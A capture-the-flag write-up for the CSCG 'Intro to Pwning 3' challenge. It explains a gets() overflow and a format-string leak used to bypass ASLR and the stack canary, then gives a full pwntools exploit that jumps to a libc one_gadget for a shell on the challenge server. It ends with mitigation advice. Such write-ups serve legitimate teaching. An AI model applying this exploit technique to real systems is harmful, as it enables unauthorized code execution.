# Intro to Pwning 3

**Author**: `Managarmr`

## Table of Contents

1. [Challenge](#1-challenge)
2. [Having a look](#2-having-a-look)
3. [Exploiting](#3-exploiting)
4. [Final exploit](#4-final-exploit)
5. [Mitigations](#5-mitigations)


## 1. Challenge

**Category**: `Pwn`  
**Difficulty**: `Baby`  
**Author**: `LiveOverflow`  
**Attachments**: [intro_pwn.zip](https://static.allesctf.net/challenges/8176578445cfc3b1f615f0683bc9173e9e2f53f5adf953c12bccf42280dacda9/intro_pwn.zip)  
**Description**:

This is a introductory challenge for exploiting Linux binaries with memory corruptions. Nowodays there are quite a few mitigations that make it not as straight forward as it used to be. So in order to introduce players to pwnable challenges, [LiveOverflow created a video walkthrough](https://www.youtube.com/watch?v=hhu7vhmuISY) of the first challenge. [An alternative writeup](https://static.allesctf.net/Tutorial_Intro_Pwn.html) can also be found by 0x4d5a. More resources can also be found [here](https://github.com/LiveOverflow/pwn_docker_example).

## 2. Having a look

### 2.1 Overview

Looking at the zip file we can see that the files for all 3 challenges have
been provided:

```
$ unzip -l intro_pwn.zip 
Archive:  intro_pwn.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-02-17 04:07   pwn3/
       23  2020-02-17 04:07   pwn3/flag
    13296  2020-02-17 04:07   pwn3/pwn3
      332  2020-02-17 04:07   pwn3/Dockerfile
    18744  2020-02-17 04:07   pwn3/ynetd
     2452  2020-02-26 21:27   pwn3/pwn3.c
        0  2020-02-17 04:07   pwn2/
       23  2020-02-17 04:07   pwn2/flag
    13336  2020-02-17 04:07   pwn2/pwn2
      332  2020-02-17 04:07   pwn2/Dockerfile
     2487  2020-02-27 22:04   pwn2/pwn2.c
    18744  2020-02-17 04:07   pwn2/ynetd
      311  2020-02-17 04:07   Makefile
        0  2020-02-17 04:07   pwn1/
     1745  2020-02-25 19:44   pwn1/pwn1.c
       23  2020-02-17 04:07   pwn1/flag
      333  2020-02-17 04:07   pwn1/Dockerfile
    18744  2020-02-17 04:07   pwn1/ynetd
    13120  2020-02-17 04:07   pwn1/pwn1
      610  2020-02-17 04:07   docker-compose.yml
---------                     -------
   104655                     20 files
```

However we are only interested in the `pwn3` directory for now.

### 2.2 Source code

Having a look at out `main()` we can see that three functions are called, namely
`check_password_stage1()`, `welcome()` and `AAAAAAAA()`:

```c
void main(int argc, char* argv[]) {
    ignore_me_init_buffering();
    ignore_me_init_signal();

    check_password_stage2();

    welcome();
    AAAAAAAA();
}
```

```c
void check_password_stage2() {
    char read_buf[0xff];
    printf("Enter the password of stage 2:\n");
    memset(read_buf, 0, sizeof(read_buf));
    read_input(0, read_buf, sizeof(read_buf));
    if(strcmp(read_buf, PASSWORD) != 0) {
        printf("-10 Points for Gryffindor!\n");
        _exit(0);
    } else {
        printf("+10 Points for Gryffindor!");
    }
}
```

```c
void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Gryffindor! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}
```

The `check_password_stage2()` function seems to be safe, but we can spot two
issues within the `welcome()` function:
1. The `gets()` call allows us to overflow the stack buffer and possible gain
code redirection.
2. The `printf()` call is given our user-provided input as format string,
allowing us to possibly leak or clobber data.

The last function `AAAAAAAA()` doesn't look much better:

```c
void AAAAAAAA() {
    char read_buf[0xff];
    
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Gryffindor!\n");
        _exit(0);
    }
}
```

And also allows us to smash the stack for fun and profit. This function also
has a caveat though, namely that  we **must** pass the `strcmp()` as we cannot
afford the call to `_exit()` as this would terminate the program without ever
using our overwritten stack values.

## 3. Exploiting

### 3.1 Checking out the binary

Looking at the binary with checksec we can see that all security features are
enabled:

```
[*] '/home/managarmr/CTF/2020/CSCG/Pwn/Intro_To_Pwning/pwn3/pwn3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Meaning we have to somehow bypass `ASLR` and `stack canaries` in order to
somehow obtain a shell.

### 3.2 Bypassing ASLR

Remember the rogue `printf()`? We can use this to defeat `ASLR` by leaking an
address:

```python
target.sendline('%p ' * 50)
leak = target.recvline_contains('spell:').split(b' ')
for i in range(0, 50):
	log.info(f'{i + 1}: {leak[i]}')
```

Which returns the following output:

```
[...snip...]
[*] 36: b'(nil)'
[*] 37: b'0xf200000000000000'
[*] 38: b'(nil)'
[*] 39: b'0xf23d45ded6cdd100'
[*] 40: b'0x7ffd383695b0'
[*] 41: b'0x55aa4d945d7e'
[*] 42: b'0x7ffd38369698'
[*] 43: b'0x100000000'
[*] 44: b'0x55aa4d945d90'
[*] 45: b'0x7f3b0f5471e3'
[*] 46: b'0x7f3b0f707598'
[*] 47: b'0x7ffd38369698'
[...snip...]
```
The address in slot `41` is our return address and the address in slot `45` is
an address within the libc, allowing us to leak the libc base address.


### 3.3 Bypassing the stack canary

As we are able to leak the whole stack bypassing the `canary` becomes trivial.
We know the return address is at offset `41`, meaning the `canary` must be at
offset `39` as the `%rbp` register is saved between them. Now we can just
replay it and there will be no problem with our exploit. We can also confirm
this to be the `canary` as the lower byte is `\0`, which is always the case for
the `stack canary`.

### 3.4 Executing /bin/sh

After bypassing `ASLR` and the `stack canary` we now need to find a way to
execute `/bin/sh`, luckily for us `GNU libc` is littered with addresses that,
if jumped to do just that.

Using `one_gadget` we can easily find those addresses and their contraints:
```
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xe6b93 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6b96 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6b99 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x10afa9 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

The last gadget at `0x10afa9` has the trivial contraint of `[rsp+0x70] == NULL`,
which is easy enough to do as we control the stack.

## 4. Final exploit

With all the information mentioned above we can finally develop our exploit:

```python
#!/usr/bin/env python3
from pwn import *
import struct

# THIS_IS_TEST_FLAG | NOW_GET_VOLDEMORT
PASSWORD = 'CSCG{NOW_GET_VOLDEMORT}' # Set to flag from stage 2

LEAK_BASE_OFFSET = 0x271e3
MAGIC_OFFSET = 0x10afa9

# target = process('./pwn3/pwn3')
target = remote('hax1.allesctf.net', 9102)

target.sendline(PASSWORD)

# Canary + Libc address
target.sendline('%39$p %45$p')
leaked = target.recvline_contains('magic spell:')
canary = int(leaked.split(b' ')[0][2:], 16)
base = int(leaked.split(b' ')[1][2:], 16) - LEAK_BASE_OFFSET

log.info(f'Leaked canary: {hex(canary)}')
log.info(f'Leaked libc base address: {hex(base)}')
log.info(f'Target address: {hex(base + MAGIC_OFFSET)}')

target.sendline(b'Expelliarmus\0' +
	b'\0' * (cyclic_find(b'cnaa')) +
	struct.pack("<Q", canary) +
	b'x' * 8 +
	struct.pack("<Q", base + MAGIC_OFFSET) +
	b'\0' * 0x78)

target.interactive()
```

Running the exploit drops us into a shell:

```
$ ./solve_3.py
[+] Opening connection to hax1.allesctf.net on port 9102: Done
[*] Leaked canary: 0x915245c209272900
[*] Leaked libc base address: 0x7f7876ac1000
[*] Target address: 0x7f7876bcbfa9
[*] Switching to interactive mode
~ Protego!
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag
pwn3
ynetd
$ cat flag
CSCG{VOLDEMORT_DID_NOTHING_WRONG}$
```

The flag for this challenge was `CSCG{VOLDEMORT_DID_NOTHING_WRONG}`.

## 5. Mitigations

There are two possible mitigations:

- Do **not** use `gets()`, rather use a safe function such as `read()`,
`fgets()`, etc.
- Do **not** pass user-supplied data as format argument to `printf()`, rather
pass it to `puts()` or use a format string of `%s`.
